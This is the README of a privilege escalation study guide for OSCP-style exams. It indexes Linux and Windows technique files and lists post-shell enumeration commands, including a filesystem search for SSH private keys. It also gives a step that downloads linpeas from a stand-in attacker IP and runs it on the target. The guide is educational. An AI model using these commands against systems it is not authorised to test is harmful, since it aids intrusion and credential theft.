# Privilege Escalation Notes — Complete Study Guide

> **Purpose:** Self-contained privilege escalation notes for NSDA exam, internship, and OSCP preparation.
> No external resources needed. Every concept, command, and technique is explained here.

---

## What is Privilege Escalation?

After getting initial access to a system (low-privilege shell), privilege escalation means finding a way to **gain higher privileges** — typically `root` on Linux or `SYSTEM/Administrator` on Windows.

```
Attack Flow:
Nmap Scan → Exploit Vulnerability → Low Shell → Privilege Escalation → Root/SYSTEM
```

You almost never land directly as root. Priv esc is what happens **after** you get in.

---

## 📁 File Structure

```
privesc-notes/
│
├── README.md                          ← You are here (Start here)
│
├── linux-privesc/
│   ├── README.md                      ← Linux-specific guide (scenario-based usage, full index)
│   ├── 00-enumeration.md
│   ├── 01-suid-abuse.md
│   ├── 02-sudo-misconfiguration.md
│   ├── 03-cron-job-abuse.md
│   ├── 04-kernel-exploit.md
│   ├── 05-weak-file-permissions.md
│   ├── 06-path-hijacking.md
│   ├── 07-capabilities.md
│   ├── 08-environment-variables.md
│   ├── 09-credential-hunting.md
│   ├── 10-docker-lxc-breakout.md
│   ├── 11-nfs-misconfiguration.md
│   ├── 12-passwd-shadow-abuse.md
│   ├── 13-ssh-key-abuse.md
│   ├── 14-wildcard-injection.md
│   ├── 15-systemd-timer-service-abuse.md
│   ├── 16-polkit-pkexec-exploitation.md
│   ├── 17-shared-library-injection.md
│   └── 18-sudo-token-tty-hijacking.md
│
└── windows-privesc/
    ├── 01-token-impersonation.md
    ├── 02-unquoted-service-path.md
    └── 03-alwaysinstallelevated.md
```

---

## 🐧 Linux Privilege Escalation

| # | Topic |
|---|-------|
| 00 | [Enumeration](linux-privesc/00-enumeration.md) |
| 01 | [SUID Abuse](linux-privesc/01-suid-abuse.md) |
| 02 | [Sudo Misconfiguration](linux-privesc/02-sudo-misconfiguration.md) |
| 03 | [Cron Job Abuse](linux-privesc/03-cron-job-abuse.md) |
| 04 | [Kernel Exploit](linux-privesc/04-kernel-exploit.md) |
| 05 | [Weak File Permissions](linux-privesc/05-weak-file-permissions.md) |
| 06 | [Path Hijacking](linux-privesc/06-path-hijacking.md) |
| 07 | [Capabilities](linux-privesc/07-capabilities.md) |
| 08 | [Environment Variables](linux-privesc/08-environment-variables.md) |
| 09 | [Credential Hunting](linux-privesc/09-credential-hunting.md) |
| 10 | [Docker / LXC Breakout](linux-privesc/10-docker-lxc-breakout.md) |
| 11 | [NFS Misconfiguration](linux-privesc/11-nfs-misconfiguration.md) |
| 12 | [/etc/passwd & /etc/shadow Abuse](linux-privesc/12-passwd-shadow-abuse.md) |
| 13 | [SSH Key Abuse](linux-privesc/13-ssh-key-abuse.md) |
| 14 | [Wildcard Injection](linux-privesc/14-wildcard-injection.md) |
| 15 | [Systemd Timer & Service Abuse](linux-privesc/15-systemd-timer-service-abuse.md) |
| 16 | [Polkit / pkexec (PwnKit)](linux-privesc/16-polkit-pkexec-exploitation.md) |
| 17 | [Shared Library Injection](linux-privesc/17-shared-library-injection.md) |
| 18 | [Sudo Token / TTY Hijacking](linux-privesc/18-sudo-token-tty-hijacking.md) |

> See `linux-privesc/README.md` for scenario-based usage (which files apply to web app pentests, internal network, CTF, legacy systems, etc.)

---

## 🪟 Windows Privilege Escalation

| # | Topic |
|---|-------|
| 01 | [Token Impersonation](windows-privesc/01-token-impersonation.md) |
| 02 | [Unquoted Service Path](windows-privesc/02-unquoted-service-path.md) |
| 03 | [AlwaysInstallElevated](windows-privesc/03-alwaysinstallelevated.md) |

---

## 🛠️ First Thing To Do After Getting a Shell

Whenever you land on a system, run these commands **immediately** to understand your situation:

### On Linux:
```bash
id                                   # Who am I? What groups am I in?
whoami                               # Current username
hostname                             # Machine name
uname -a                             # Kernel version (important for kernel exploits)
cat /etc/os-release                  # OS version
sudo -l                              # What can I run as sudo? Also check for pwfeedback, env_keep
find / -perm -u=s 2>/dev/null        # All SUID binaries
getcap -r / 2>/dev/null              # Capabilities
cat /etc/crontab                     # Scheduled jobs
systemctl list-timers --all          # Systemd timers (modern cron replacement)
cat /etc/exports 2>/dev/null         # NFS shares
find / -name "id_rsa" 2>/dev/null    # SSH private keys
```

### On Windows:
```cmd
whoami                              # Current user
whoami /priv                        # What privileges do I have?
whoami /groups                      # What groups am I in?
systeminfo                          # OS version, patch level
net users                           # All users
net localgroup administrators       # Who is admin?
```

---

## 📌 Quick Reference — Automated Tools

| Tool | OS | Usage |
|------|----|-------|
| `linpeas.sh` | Linux | Automated Linux priv esc scanner |
| `winpeas.exe` | Windows | Automated Windows priv esc scanner |

### How to transfer linpeas to target:
```bash
# On your Kali machine — start a web server
python3 -m http.server 8080

# On the target machine — download and run
wget http://YOUR_KALI_IP:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

> **Note:** In exams, always run linpeas/winpeas first. Then manually exploit what it finds.

---

## Learning Order

```
Linux (start here):
00 Enumeration                         → Always first
01 SUID Abuse                          → Easiest, most common
02 Sudo Misconfig                      → Very common in real world
07 Capabilities                        → Fast check, often overlooked
03 Cron Job Abuse + 15 Systemd Timers  → Check both on every box
05 Weak Permissions + 12 passwd/shadow → File permission vectors
13 SSH Key Abuse                       → Especially on internal/infra boxes
10 Docker / LXC Breakout               → If docker/lxd in groups
11 NFS Misconfiguration                → If NFS ports open
14 Wildcard Injection                  → Check alongside cron findings
16 PwnKit / Polkit                     → Quick CVE check, worth always running
17 Shared Library Injection            → Follow up on SUID binary ldd output
18 Sudo Token / TTY Hijacking          → If pwfeedback in sudo -l output
06 Path Hijacking + 08 Env Variables   → When common vectors exhausted
09 Credential Hunting                  → Run in parallel throughout
04 Kernel Exploit                      → Last resort

Windows:
06 Token Impersonation                 → Most important Windows technique
07 Unquoted Service Path
08 AlwaysInstallElevated
```

---

## 🗺️ What to Learn Next

After completing these notes:

### 1. Active Directory (AD) Attacks

| Topic | What it covers |
|-------|---------------|
| Kerberoasting | Steal and crack service account password hashes from Active Directory |
| AS-REP Roasting | Attack accounts that don't require Kerberos pre-authentication |
| Pass-the-Hash | Use NTLM hash directly to authenticate — no password cracking needed |
| Pass-the-Ticket | Steal Kerberos tickets and reuse them for authentication |
| BloodHound | Map AD permissions visually to find attack paths to Domain Admin |
| DCSync | Impersonate a Domain Controller and dump all password hashes |

**Tools:** BloodHound, Impacket suite, CrackMapExec, Rubeus, Mimikatz

---

### 2. Post-Exploitation

| Topic | What it covers |
|-------|---------------|
| Credential Dumping | Extract passwords and hashes from memory (Mimikatz, secretsdump) |
| Lateral Movement | Use access on one machine to move to other machines on the network |
| Pivoting | Route traffic through a compromised machine to reach internal networks |
| Persistence | Maintain access even after reboot (backdoors, scheduled tasks) |
| Covering Tracks | Clear logs to avoid detection |

**Tools:** Mimikatz, Metasploit (post modules), Chisel (pivoting), proxychains

---

### 3. Advanced Windows Privilege Escalation

| Topic | What it covers |
|-------|---------------|
| DLL Hijacking | Place malicious DLL where a privileged program looks for it |
| Weak Service Permissions | Directly modify a service binary path to point to your payload |
| Stored Credentials | Find plaintext passwords in registry, config files, command history |
| SeDebugPrivilege | Inject into privileged processes if you have debug privilege |

---

### 4. Web Application Privilege Escalation

| Topic | What it covers |
|-------|---------------|
| RCE to Shell | Turning Remote Code Execution into a proper reverse shell |
| Container Escapes | Breaking out of Docker containers to reach the host |
| SSRF to Internal Access | Using Server-Side Request Forgery to access internal services |
| File Upload to Shell | Uploading webshells and stabilizing the shell |

---

### Suggested Learning Path After This

```
Current (these notes)
        ↓
Post-Exploitation basics (credential dumping, lateral movement)
        ↓
Active Directory attacks (Kerberoasting, BloodHound, Pass-the-Hash)
        ↓
Advanced Windows priv esc (DLL hijacking, service abuse)
        ↓
OSCP preparation (TryHackMe Pro labs / HackTheBox)
```

**Best Practice Platforms:**
- TryHackMe — structured learning rooms for each topic above
- HackTheBox — more realistic machines, good for OSCP prep
- PortSwigger Web Academy — already using this for web app sec
